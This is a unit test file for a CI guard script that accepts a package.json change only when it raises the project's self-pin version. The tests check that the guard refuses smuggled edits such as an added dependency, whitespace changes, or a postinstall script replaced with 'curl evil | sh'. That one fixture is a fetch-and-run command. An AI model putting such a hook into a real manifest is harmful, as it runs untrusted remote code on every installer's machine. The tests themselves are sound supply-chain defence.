/**
 * The privileged push job accepts only a one-value self-pin raise
 * (CodySwannGT/lisa#4951).
 *
 * The job that holds the ruleset-bypassing deploy key installs nothing and
 * trusts nothing the unprivileged job produced. `verify-self-pin-raise.mjs` is
 * its only gate on package.json: the candidate must be main's text with exactly
 * the self-pin value replaced. Every case below is a way a compromised prepare
 * job could try to smuggle a second change through.
 * @module tests/unit/scripts/verify-self-pin-raise
 */
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

import { describe, expect, it, vi } from "vitest";

import {
  main,
  verifySelfPinRaise,
} from "../../../scripts/verify-self-pin-raise.mjs";

/** The package whose pin is raised. */
const SELF = "@codyswann/lisa";

/** The version the release published. */
const PUBLISHED = "6.0.0";

/** main's manifest before the raise. */
const BASE = {
  name: SELF,
  scripts: { postinstall: "node ./scripts/setup.mjs" },
  devDependencies: {
    "prettier-compat-3-9": "npm:prettier@3.9.10",
    [SELF]: "^5.0.1",
  },
};

/**
 * Serialise a manifest the way the repository stores it.
 * @param manifest - The manifest.
 * @returns Two-space JSON with a trailing newline.
 */
function text(manifest: Record<string, unknown>): string {
  return `${JSON.stringify(manifest, null, 2)}\n`;
}

/** The candidate a correct raise produces. */
const RAISED = text({
  ...BASE,
  devDependencies: { ...BASE.devDependencies, [SELF]: `^${PUBLISHED}` },
});

describe("the push job accepts only the self-pin line (#4951)", () => {
  it("accepts main's manifest with only the pin raised", () => {
    expect(verifySelfPinRaise(text(BASE), RAISED, PUBLISHED).ok).toBe(true);
  });

  it("refuses a candidate that also changes a script", () => {
    const smuggled = text({
      ...BASE,
      scripts: { postinstall: "curl evil | sh" },
      devDependencies: { ...BASE.devDependencies, [SELF]: `^${PUBLISHED}` },
    });

    expect(verifySelfPinRaise(text(BASE), smuggled, PUBLISHED).ok).toBe(false);
  });

  it("refuses a candidate that adds a dependency", () => {
    const smuggled = text({
      ...BASE,
      devDependencies: {
        ...BASE.devDependencies,
        [SELF]: `^${PUBLISHED}`,
        extra: "1.0.0",
      },
    });

    expect(verifySelfPinRaise(text(BASE), smuggled, PUBLISHED).ok).toBe(false);
  });

  it("refuses a pin to anything but the published version", () => {
    const other = text({
      ...BASE,
      devDependencies: { ...BASE.devDependencies, [SELF]: "^6.0.1" },
    });

    expect(verifySelfPinRaise(text(BASE), other, PUBLISHED).ok).toBe(false);
  });

  it("refuses a version that is not a plain release", () => {
    expect(verifySelfPinRaise(text(BASE), RAISED, "6.0.0-rc.1").ok).toBe(false);
    expect(verifySelfPinRaise(text(BASE), RAISED, "6.0.0 || *").ok).toBe(false);
  });

  it("refuses a whitespace-only reformatting alongside the raise", () => {
    expect(
      verifySelfPinRaise(text(BASE), RAISED.replace("\n", "\n "), PUBLISHED).ok
    ).toBe(false);
  });

  it("refuses when main already pins the version, so nothing is pushed", () => {
    expect(verifySelfPinRaise(RAISED, RAISED, PUBLISHED).ok).toBe(false);
  });

  it("refuses when main declares no self-pin", () => {
    expect(verifySelfPinRaise(text({ name: SELF }), RAISED, PUBLISHED).ok).toBe(
      false
    );
  });

  it("exits 0 only for a proven raise through the CLI", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "verify-self-pin-"));
    const base = path.join(dir, "base.json");
    const candidate = path.join(dir, "candidate.json");
    writeFileSync(base, text(BASE));
    writeFileSync(candidate, RAISED);
    const stdout = vi.spyOn(process.stdout, "write").mockReturnValue(true);
    const stderr = vi.spyOn(process.stderr, "write").mockReturnValue(true);

    const accepted = main([
      "--base",
      base,
      "--candidate",
      candidate,
      "--version",
      PUBLISHED,
    ]);
    writeFileSync(candidate, text(BASE));
    const refused = main([
      "--base",
      base,
      "--candidate",
      candidate,
      "--version",
      PUBLISHED,
    ]);
    const missing = main(["--base", base]);
    const printed = stdout.mock.calls.map(call => String(call[0])).join("");
    stdout.mockRestore();
    stderr.mockRestore();

    expect(accepted).toBe(0);
    expect(refused).toBe(1);
    expect(missing).toBe(1);
    expect(printed).toContain("verify-self-pin-raise: ok");
    expect(printed).toContain("verify-self-pin-raise: refused");
  });
});
